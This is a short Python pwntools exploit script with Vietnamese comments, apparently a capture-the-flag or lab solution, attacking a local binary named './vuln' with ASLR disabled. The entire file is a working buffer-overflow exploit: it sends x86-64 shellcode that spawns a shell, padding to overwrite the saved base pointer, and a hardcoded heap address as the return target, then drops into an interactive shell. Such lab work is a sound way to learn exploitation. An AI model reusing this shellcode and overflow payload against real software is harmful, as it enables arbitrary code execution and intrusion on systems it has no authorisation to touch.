#usr/bin/python
#ASLR =0

from pwn import *


r = process("./vuln")

raw_input("attach %d" %r.pid)

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
buff = "A"*(0x400-len(shellcode)+8) #+8 tran rbp
heap_address = p64(0x00602010)


payload = shellcode 
payload += buff
payload += heap_address 

#aslr=0 >>> dia chi heap khong doi >>> co the dung
#ban dau nhap vao "A"*8 dung lenh search ta co duoc dia chi luu bien nhap vao (heap_address) >>> buffer de dua ham ret tro ve noi luu shellcode de thuc thi shellcode 

r.sendline(payload)
r.interactive()
